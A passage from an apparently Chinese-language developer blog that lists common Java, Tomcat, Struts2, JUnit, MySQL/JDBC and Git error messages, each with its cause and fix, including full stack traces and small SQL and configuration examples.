设置不同</li><li>也可能是你更换/更新了 JDK 版本(需要完全一致，包括第几次修订)导致该版本与 Tomcat 设置的版本不匹配</li></ul><h4 id="解决办法：-2"><a href="#解决办法：-2" class="headerlink" title="解决办法："></a>解决办法：</h4><p>重新配置 tomcat</p><ol><li>如图：右键 Servers 窗口空白位置 —— New —— Server —— Configure runtime environments… —— Add —— 选择 Tomcat 版本 —— Next<br><img src="http://wx4.sinaimg.cn/mw690/a6e9cb00ly1ff4rlvtwfdj217f0jrwi6.jpg" alt="设置 Tomcat 对应的 JDK 版本 No.1"></li><li>如图：选择 Tomcat 安装目录 —— 选择 JDK 版本 —— Finish<br><img src="http://wx4.sinaimg.cn/mw690/a6e9cb00ly1ff4red30u5j20el0fqmxw.jpg" alt="设置 Tomcat 对应的 JDK 版本 No.2"></li></ol><br>### Exception starting filter [struts2] java.lang.ClassNotFoundException: org.apache.struts2.dispatcher.filter.StrutsPrepareAndExecuteFilter<h4 id="报错信息：-3"><a href="#报错信息：-3" class="headerlink" title="报错信息："></a>报错信息：</h4><pre class="line-numbers language-log" data-language="log"><code class="language-log">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">.</span>StandardContext<span class="token punctuation">.</span>filterStart Exception starting filter <span class="token punctuation">[</span>struts2<span class="token punctuation">]</span> <span class="token exception javastacktrace language-javastacktrace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>ClassNotFoundException<span class="token punctuation">:</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>struts2<span class="token punctuation">.</span>dispatcher<span class="token punctuation">.</span>filter<span class="token punctuation">.</span>StrutsPrepareAndExecuteFilter    <span class="token keyword">at</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>loader<span class="token punctuation">.</span>WebappClassLoaderBase<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>WebappClassLoaderBase<span class="token punctuation">.</span>java<span class="token punctuation">:</span>1275<span class="token punctuation">)</span>    <span class="token keyword">at</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>loader<span class="token punctuation">.</span>WebappClassLoaderBase<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>WebappClassLoaderBase<span class="token punctuation">.</span>java<span class="token punctuation">:</span>1109<span class="token punctuation">)</span>    <span class="token keyword">at</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">.</span>DefaultInstanceManager<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>DefaultInstanceManager<span class="token punctuation">.</span>java<span class="token punctuation">:</span>508<span class="token punctuation">)</span>    <span class="token keyword">at</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">.</span>DefaultInstanceManager<span class="token punctuation">.</span><span class="token function">loadClassMaybePrivileged</span><span class="token punctuation">(</span>DefaultInstanceManager<span class="token punctuation">.</span>java<span class="token punctuation">:</span>489<span class="token punctuation">)</span>    <span class="token keyword">at</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">.</span>DefaultInstanceManager<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span>DefaultInstanceManager<span class="token punctuation">.</span>java<span class="token punctuation">:</span>119<span class="token punctuation">)</span>    <span class="token keyword">at</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">.</span>ApplicationFilterConfig<span class="token punctuation">.</span><span class="token function">getFilter</span><span class="token punctuation">(</span>ApplicationFilterConfig<span class="token punctuation">.</span>java<span class="token punctuation">:</span>264<span class="token punctuation">)</span>    <span class="token keyword">at</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">.</span>ApplicationFilterConfig<span class="token punctuation">.</span>&lt;init&gt;<span class="token punctuation">(</span>ApplicationFilterConfig<span class="token punctuation">.</span>java<span class="token punctuation">:</span>108<span class="token punctuation">)</span>    <span class="token keyword">at</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">.</span>StandardContext<span class="token punctuation">.</span><span class="token function">filterStart</span><span class="token punctuation">(</span>StandardContext<span class="token punctuation">.</span>java<span class="token punctuation">:</span>4580<span class="token punctuation">)</span>    <span class="token keyword">at</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">.</span>StandardContext<span class="token punctuation">.</span><span class="token function">startInternal</span><span class="token punctuation">(</span>StandardContext<span class="token punctuation">.</span>java<span class="token punctuation">:</span>5222<span class="token punctuation">)</span>    <span class="token keyword">at</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>util<span class="token punctuation">.</span>LifecycleBase<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span>LifecycleBase<span class="token punctuation">.</span>java<span class="token punctuation">:</span>183<span class="token punctuation">)</span>    <span class="token keyword">at</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">.</span>ContainerBase<span class="token punctuation">.</span><span class="token function">addChildInternal</span><span class="token punctuation">(</span>ContainerBase<span class="token punctuation">.</span>java<span class="token punctuation">:</span>752<span class="token punctuation">)</span>    <span class="token keyword">at</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">.</span>ContainerBase<span class="token punctuation">.</span><span class="token function">addChild</span><span class="token punctuation">(</span>ContainerBase<span class="token punctuation">.</span>java<span class="token punctuation">:</span>728<span class="token punctuation">)</span>    <span class="token keyword">at</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>core<span class="token punctuation">.</span>StandardHost<span class="token punctuation">.</span><span class="token function">addChild</span><span class="token punctuation">(</span>StandardHost<span class="token punctuation">.</span>java<span class="token punctuation">:</span>734<span class="token punctuation">)</span>    <span class="token keyword">at</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>startup<span class="token punctuation">.</span>HostConfig<span class="token punctuation">.</span><span class="token function">manageApp</span><span class="token punctuation">(</span>HostConfig<span class="token punctuation">.</span>java<span class="token punctuation">:</span>1702<span class="token punctuation">)</span>    <span class="token keyword">at</span> sun<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>NativeMethodAccessorImpl<span class="token punctuation">.</span><span class="token function">invoke0</span><span class="token punctuation">(</span>Native Method<span class="token punctuation">)</span>    <span class="token keyword">at</span> sun<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>NativeMethodAccessorImpl<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>NativeMethodAccessorImpl<span class="token punctuation">.</span>java<span class="token punctuation">:</span>62<span class="token punctuation">)</span>    <span class="token keyword">at</span> sun<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>DelegatingMethodAccessorImpl<span class="token punctuation">.</span><span class="token function">__invoke</span><span class="token punctuation">(</span>DelegatingMethodAccessorImpl<span class="token punctuation">.</span>java<span class="token punctuation">:</span>43<span class="token punctuation">)</span>    <span class="token keyword">at</span> sun<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>DelegatingMethodAccessorImpl<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>DelegatingMethodAccessorImpl<span class="token punctuation">.</span>java<span class="token punctuation">)</span>    <span class="token keyword">at</span> sun<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>DelegatingMethodAccessorImpl<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>DelegatingMethodAccessorImpl<span class="token punctuation">.</span>java<span class="token punctuation">)</span>    <span class="token keyword">at</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>Method<span class="token punctuation">.</span>java<span class="token punctuation">:</span>498<span class="token punctuation">)</span>    <span class="token keyword">at</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>tomcat<span class="token punctuation">.</span>util<span class="token punctuation">.</span>modeler<span class="token punctuation">.</span>BaseModelMBean<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>BaseModelMBean<span class="token punctuation">.</span>java<span class="token punctuation">:</span>300<span class="token punctuation">)</span>    <span class="token keyword">at</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jmx<span class="token punctuation">.</span>interceptor<span class="token punctuation">.</span>DefaultMBeanServerInterceptor<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>DefaultMBeanServerInterceptor<span class="token punctuation">.</span>java<span class="token punctuation">:</span>819<span class="token punctuation">)</span>    <span class="token keyword">at</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jmx<span class="token punctuation">.</span>mbeanserver<span class="token punctuation">.</span>JmxMBeanServer<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>JmxMBeanServer<span class="token punctuation">.</span>java<span class="token punctuation">:</span>801<span class="token punctuation">)</span>    <span class="token keyword">at</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>mbeans<span class="token punctuation">.</span>MBeanFactory<span class="token punctuation">.</span><span class="token function">createStandardContext</span><span class="token punctuation">(</span>MBeanFactory<span class="token punctuation">.</span>java<span class="token punctuation">:</span>456<span class="token punctuation">)</span>    <span class="token keyword">at</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>catalina<span class="token punctuation">.</span>mbeans<span class="token punctuation">.</span>MBeanFactory<span class="token punctuation">.</span><span class="token function">createStandardContext</span><span class="token punctuation">(</span>MBeanFactory<span class="token punctuation">.</span>java<span class="token punctuation">:</span>405<span class="token punctuation">)</span>    <span class="token keyword">at</span> sun<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>NativeMethodAccessorImpl<span class="token punctuation">.</span><span class="token function">invoke0</span><span class="token punctuation">(</span>Native Method<span class="token punctuation">)</span>    <span class="token keyword">at</span> sun<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>NativeMethodAccessorImpl<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>NativeMethodAccessorImpl<span class="token punctuation">.</span>java<span class="token punctuation">:</span>62<span class="token punctuation">)</span>    <span class="token keyword">at</span> sun<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>DelegatingMethodAccessorImpl<span class="token punctuation">.</span><span class="token function">__invoke</span><span class="token punctuation">(</span>DelegatingMethodAccessorImpl<span class="token punctuation">.</span>java<span class="token punctuation">:</span>43<span class="token punctuation">)</span>    <span class="token keyword">at</span> sun<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>DelegatingMethodAccessorImpl<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>DelegatingMethodAccessorImpl<span class="token punctuation">.</span>java<span class="token punctuation">)</span>    <span class="token keyword">at</span> sun<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>DelegatingMethodAccessorImpl<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>DelegatingMethodAccessorImpl<span class="token punctuation">.</span>java<span class="token punctuation">)</span>    <span class="token keyword">at</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>Method<span class="token punctuation">.</span>java<span class="token punctuation">:</span>498<span class="token punctuation">)</span>    <span class="token keyword">at</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>tomcat<span class="token punctuation">.</span>util<span class="token punctuation">.</span>modeler<span class="token punctuation">.</span>BaseModelMBean<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>BaseModelMBean<span class="token punctuation">.</span>java<span class="token punctuation">:</span>300<span class="token punctuation">)</span>    <span class="token keyword">at</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jmx<span class="token punctuation">.</span>interceptor<span class="token punctuation">.</span>DefaultMBeanServerInterceptor<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>DefaultMBeanServerInterceptor<span class="token punctuation">.</span>java<span class="token punctuation">:</span>819<span class="token punctuation">)</span>    <span class="token keyword">at</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jmx<span class="token punctuation">.</span>mbeanserver<span class="token punctuation">.</span>JmxMBeanServer<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>JmxMBeanServer<span class="token punctuation">.</span>java<span class="token punctuation">:</span>801<span class="token punctuation">)</span>    <span class="token keyword">at</span> javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RMIConnectionImpl<span class="token punctuation">.</span><span class="token function">doOperation</span><span class="token punctuation">(</span>RMIConnectionImpl<span class="token punctuation">.</span>java<span class="token punctuation">:</span>1468<span class="token punctuation">)</span>    <span class="token keyword">at</span> javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RMIConnectionImpl<span class="token punctuation">.</span><span class="token function">access$300</span><span class="token punctuation">(</span>RMIConnectionImpl<span class="token punctuation">.</span>java<span class="token punctuation">:</span>76<span class="token punctuation">)</span>    <span class="token keyword">at</span> javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RMIConnectionImpl$PrivilegedOperation<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span>RMIConnectionImpl<span class="token punctuation">.</span>java<span class="token punctuation">:</span>1309<span class="token punctuation">)</span>    <span class="token keyword">at</span> javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RMIConnectionImpl<span class="token punctuation">.</span><span class="token function">doPrivilegedOperation</span><span class="token punctuation">(</span>RMIConnectionImpl<span class="token punctuation">.</span>java<span class="token punctuation">:</span>1401<span class="token punctuation">)</span>    <span class="token keyword">at</span> javax<span class="token punctuation">.</span>management<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>RMIConnectionImpl<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>RMIConnectionImpl<span class="token punctuation">.</span>java<span class="token punctuation">:</span>829<span class="token punctuation">)</span>    <span class="token keyword">at</span> sun<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>NativeMethodAccessorImpl<span class="token punctuation">.</span><span class="token function">invoke0</span><span class="token punctuation">(</span>Native Method<span class="token punctuation">)</span>    <span class="token keyword">at</span> sun<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>NativeMethodAccessorImpl<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>NativeMethodAccessorImpl<span class="token punctuation">.</span>java<span class="token punctuation">:</span>62<span class="token punctuation">)</span>    <span class="token keyword">at</span> sun<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>DelegatingMethodAccessorImpl<span class="token punctuation">.</span><span class="token function">__invoke</span><span class="token punctuation">(</span>DelegatingMethodAccessorImpl<span class="token punctuation">.</span>java<span class="token punctuation">:</span>43<span class="token punctuation">)</span>    <span class="token keyword">at</span> sun<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>DelegatingMethodAccessorImpl<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>DelegatingMethodAccessorImpl<span class="token punctuation">.</span>java<span class="token punctuation">)</span>    <span class="token keyword">at</span> sun<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>DelegatingMethodAccessorImpl<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>DelegatingMethodAccessorImpl<span class="token punctuation">.</span>java<span class="token punctuation">)</span>    <span class="token keyword">at</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span>Method<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>Method<span class="token punctuation">.</span>java<span class="token punctuation">:</span>498<span class="token punctuation">)</span>    <span class="token keyword">at</span> sun<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>server<span class="token punctuation">.</span>UnicastServerRef<span class="token punctuation">.</span><span class="token function">dispatch</span><span class="token punctuation">(</span>UnicastServerRef<span class="token punctuation">.</span>java<span class="token punctuation">:</span>346<span class="token punctuation">)</span>    <span class="token keyword">at</span> sun<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>Transport$1<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span>Transport<span class="token punctuation">.</span>java<span class="token punctuation">:</span>200<span class="token punctuation">)</span>    <span class="token keyword">at</span> sun<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>Transport$1<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span>Transport<span class="token punctuation">.</span>java<span class="token punctuation">:</span>197<span class="token punctuation">)</span>    <span class="token keyword">at</span> java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>AccessController<span class="token punctuation">.</span><span class="token function">doPrivileged</span><span class="token punctuation">(</span>Native Method<span class="token punctuation">)</span>    <span class="token keyword">at</span> sun<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>Transport<span class="token punctuation">.</span><span class="token function">serviceCall</span><span class="token punctuation">(</span>Transport<span class="token punctuation">.</span>java<span class="token punctuation">:</span>196<span class="token punctuation">)</span>    <span class="token keyword">at</span> sun<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>tcp<span class="token punctuation">.</span>TCPTransport<span class="token punctuation">.</span><span class="token function">handleMessages</span><span class="token punctuation">(</span>TCPTransport<span class="token punctuation">.</span>java<span class="token punctuation">:</span>568<span class="token punctuation">)</span>    <span class="token keyword">at</span> sun<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>tcp<span class="token punctuation">.</span>TCPTransport$ConnectionHandler<span class="token punctuation">.</span><span class="token function">run0</span><span class="token punctuation">(</span>TCPTransport<span class="token punctuation">.</span>java<span class="token punctuation">:</span>826<span class="token punctuation">)</span>    <span class="token keyword">at</span> sun<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>tcp<span class="token punctuation">.</span>TCPTransport$ConnectionHandler<span class="token punctuation">.</span><span class="token function">lambda$run$0</span><span class="token punctuation">(</span>TCPTransport<span class="token punctuation">.</span>java<span class="token punctuation">:</span>683<span class="token punctuation">)</span>    <span class="token keyword">at</span> java<span class="token punctuation">.</span>security<span class="token punctuation">.</span>AccessController<span class="token punctuation">.</span><span class="token function">doPrivileged</span><span class="token punctuation">(</span>Native Method<span class="token punctuation">)</span>    <span class="token keyword">at</span> sun<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>transport<span class="token punctuation">.</span>tcp<span class="token punctuation">.</span>TCPTransport$ConnectionHandler<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span>TCPTransport<span class="token punctuation">.</span>java<span class="token punctuation">:</span>682<span class="token punctuation">)</span>    <span class="token keyword">at</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>ThreadPoolExecutor<span class="token punctuation">.</span><span class="token function">runWorker</span><span class="token punctuation">(</span>ThreadPoolExecutor<span class="token punctuation">.</span>java<span class="token punctuation">:</span>1142<span class="token punctuation">)</span>    <span class="token keyword">at</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>ThreadPoolExecutor$Worker<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span>ThreadPoolExecutor<span class="token punctuation">.</span>java<span class="token punctuation">:</span>617<span class="token punctuation">)</span>    <span class="token keyword">at</span> java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Thread<span class="token punctuation">.</span><span class="token function">run</span><span class="token punctuation">(</span>Thread<span class="token punctuation">.</span>java<span class="token punctuation">:</span>748<span class="token punctuation">)</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="报错原因：-4"><a href="#报错原因：-4" class="headerlink" title="报错原因："></a>报错原因：</h4><ul><li>Web 项目中没有导入自定义的依赖包</li></ul><h4 id="解决办法：-3"><a href="#解决办法：-3" class="headerlink" title="解决办法："></a>解决办法：</h4><ul><li>Eclipse 中，可以按照下面的步骤解决该问题：<ul><li>打开 Markers 选项卡（Windows &gt; Show View &gt; Markers)</li><li>展开 “Classpath Dependency Validator Message”</li><li>右键 “Classpath entry org.eclipse.jdt.USER_LIBRARY/struts2 will not be exported or published. Runtime ClassNotFoundExceptions may result.”</li><li>点击 “Quick Fix”</li><li>选择 “Mark the associated raw classpath entry as a publish/export dependency.”</li><li>点击 “Finish”</li></ul></li><li>IDEA 中，可以按照下面的步骤解决：<br><img src="http://wx1.sinaimg.cn/mw690/a6e9cb00ly1fgf11jojlwj21kw1bpdoe.jpg" alt="解决方法"></li></ul><h4 id="参考：-1"><a href="#参考：-1" class="headerlink" title="参考："></a>参考：</h4><p><a href="https://stackoverflow.com/questions/23421278/exception-starting-filter-struts2-java-lang-classnotfoundexception-org-apache-s">stackoverflow.com</a></p><br>### !!! JUnit version 3.8 or later expected:<h4 id="报错信息：-4"><a href="#报错信息：-4" class="headerlink" title="报错信息："></a>报错信息：</h4><pre class="line-numbers language-none"><code class="language-none">!!! JUnit version 3.8 or later expected:java.lang.RuntimeException: Stub!    at junit.runner.BaseTestRunner.&lt;init&gt;(BaseTestRunner.java:5)    at junit.textui.TestRunner.&lt;init&gt;(TestRunner.java:54)    at junit.textui.TestRunner.&lt;init&gt;(TestRunner.java:48)    at junit.textui.TestRunner.&lt;init&gt;(TestRunner.java:41)    at com.intellij.rt.execution.junit.JUnitStarter.junitVersionChecks(JUnitStarter.java:224)    at com.intellij.rt.execution.junit.JUnitStarter.canWorkWithJUnitVersion(JUnitStarter.java:207)    at com.intellij.rt.execution.junit.JUnitStarter.main(JUnitStarter.java:61)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="报错原因：-5"><a href="#报错原因：-5" class="headerlink" title="报错原因："></a>报错原因：</h4><p>Android 平台（android.jar）已经包含了 JUnit 类。当你试图用新的 JUnit 注解测试代码时，IDEA 测试运行这些类并认为这些类来自旧的 JUnit，所以得到了这个错误信息。</p><blockquote><p><a href="https://stackoverflow.com/questions/2422378/intellij-idea-with-junit-4-7-junit-version-3-8-or-later-expected">原文</a>：This problem happens because Android Platform (android.jar) already contains JUnit classes. IDEA test runner loads these classes and sees that they are from the old JUnit, while you are trying to use annotated tests which is a feature of the new JUnit, therefore you get the error from the test runner.</p></blockquote><h4 id="解决办法：-4"><a href="#解决办法：-4" class="headerlink" title="解决办法："></a>解决办法：</h4><ul><li>打开 Project Structure &gt; Modules &gt; Dependencies</li><li>移除 你自己导入的 JUnit-x.x.jar.</li></ul><br>## MySQL Issues<h3 id="1089-incorrect-prefix-key"><a href="#1089-incorrect-prefix-key" class="headerlink" title="#1089-incorrect prefix key"></a>#1089-incorrect prefix key</h3><pre class="line-numbers language-MySQL" data-language="MySQL"><code class="language-MySQL">CREATE TABLE `table`.`users` (    `id` INT(11) NOT NULL AUTO_INCREMENT,    `username` VARCHAR(50) NOT NULL,    `password` VARCHAR(50) NOT NULL,    `dir` VARCHAR(100) NOT NULL,    PRIMARY KEY (`id`(11))) ENGINE = MyISAM;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="报错信息：-5"><a href="#报错信息：-5" class="headerlink" title="报错信息："></a>报错信息：</h4><p>#1089-incorrect prefix key;the used key part isn’t a string,the used length is longer than the key part,or the storage engine doesn’t support unique prefix keys.</p><h4 id="报错原因：-6"><a href="#报错原因：-6" class="headerlink" title="报错原因："></a>报错原因：</h4><ul><li>在定义 PRIMARY KEY 时候使用了 <code>(id(11))</code>, 这定义了 prefix key —— 也就是主键前面的 11 个字符只能用来创建索引。prefix key 只支持 CHAR、VARCHAR、BINARY 和 VARBINARY 类型，而这里使用了 int 类型，所以报错了。翻译自 <a href="http://stackoverflow.com/questions/28932281/what-is-wrong-with-my-sql-here-1089-incorrect-prefix-key">stackoverflow</a>。</li></ul><h4 id="解决办法：-5"><a href="#解决办法：-5" class="headerlink" title="解决办法："></a>解决办法：</h4><ul><li>将<pre class="line-numbers language-MySQL" data-language="MySQL"><code class="language-MySQL">PRIMARY KEY (`id`(11))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>改为<pre class="line-numbers language-MySQL" data-language="MySQL"><code class="language-MySQL">PRIMARY KEY (`id`)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h4 id="参考：-2"><a href="#参考：-2" class="headerlink" title="参考："></a>参考：</h4><p><a href="https://dev.mysql.com/doc/refman/5.5/en/create-index.html">MySQL 官方文档</a></p><br>### com.mysql.jdbc.exceptions.jdbc4.CommunicationsException: Communications link failure<h4 id="报错信息：-6"><a href="#报错信息：-6" class="headerlink" title="报错信息："></a>报错信息：</h4><p>com.mysql.jdbc.exceptions.jdbc4.CommunicationsException: Communications link failure.<br>The last packet sent successfully to the server was 0 milliseconds ago. The driver has not received any packets from the server.</p><h4 id="报错原因：-7"><a href="#报错原因：-7" class="headerlink" title="报错原因："></a>报错原因：</h4><ul><li>未开启 mysql 服务</li></ul><h4 id="解决办法：-6"><a href="#解决办法：-6" class="headerlink" title="解决办法："></a>解决办法：</h4><ul><li>启动 mysql 服务</li></ul><br>### 使用 PreparedStatement 将中文数据存入 mysql 中显示 "?"<h4 id="表现形式："><a href="#表现形式：" class="headerlink" title="表现形式："></a>表现形式：</h4><ul><li>在数据库中查看插入的中文数据全都显示 “?”，Java 取出来的数据也显示 “?”</li><li>在数据库工具中手动插入的中文数据正常显示，Java 取出来的数据也正常显示。</li><li>preparedStatement 语句执行前，通过<pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">System.out.println(preparedStatement.toString());<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>输出的 mysql 语句，其中文数据也显示 ?<pre class="line-numbers language-none"><code class="language-none">com.mysql.jdbc.JDBC42PreparedStatement@4102b8: INSERT INTO catgory VALUES ('d6509', '??', 1)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><h4 id="问题原因："><a href="#问题原因：" class="headerlink" title="问题原因："></a>问题原因：</h4><p>设置驱动时未指定编码格式。</p><h4 id="解决办法：-7"><a href="#解决办法：-7" class="headerlink" title="解决办法："></a>解决办法：</h4><p>将原先的数据库驱动配置</p><pre class="line-numbers language-none"><code class="language-none">jdbc:mysql://localhost:3306/数据库名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>改为</p><pre class="line-numbers language-none"><code class="language-none">jdbc:mysql://localhost:3306/数据库名?characterEncoding=utf8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>其中数据库名为你自己的数据库名称</p></blockquote><br>### Unknown systme variable 'xxxx'<h4 id="表现形式：-1"><a href="#表现形式：-1" class="headerlink" title="表现形式："></a>表现形式：</h4><ul><li>执行 SQL 或连接数据库时提示类似 <code>[HY000][1193] Unknown system variable 'OPTION'</code> 的错误</li></ul><h4 id="问题原因：-1"><a href="#问题原因：-1" class="headerlink" title="问题原因："></a>问题原因：</h4><p>MySQL 版本和 JDBC 驱动版本不一致导致的</p><h4 id="解决办法：-8"><a href="#解决办法：-8" class="headerlink" title="解决办法："></a>解决办法：</h4><p>更换与当前 MySQL 对应的 JDBC 驱动</p><br>## HTML Issues<br>## Git<h3 id="You-asked-to-pull-from-the-remote-‘master’-but-did-not-specify"><a href="#You-asked-to-pull-from-the-remote-‘master’-but-did-not-specify" class="headerlink" title="You asked to pull from the remote ‘master’, but did not specify"></a>You asked to pull from the remote ‘master’, but did not specify</h3><p>a branch. </p><h4 id="错误提示："><a href="#错误提示：" class="headerlink" title="错误提示："></a>错误提示：</h4><p>You asked to pull from the remote ‘master’, but did not specify<br>a branch. Because this is not the default configured remote<br>for your current branch, you must specify a branch on the command line.</p><h4 id="报错原因：-8"><a href="#报错原因：-8" class="headerlink" title="报错原因："></a>报错原因：</h4><p>你拉取指定名为 “master” 的远程仓库，但是该远程仓库没有指定分支。因为你当前的分支不是默认的远程仓库，所以必须要指定一个分支。</p><h4 id="解决办法：-9"><a href="#解决办法：-9" class="headerlink" title="解决办法："></a>解决办法：</h4><ul><li>编辑项目下的 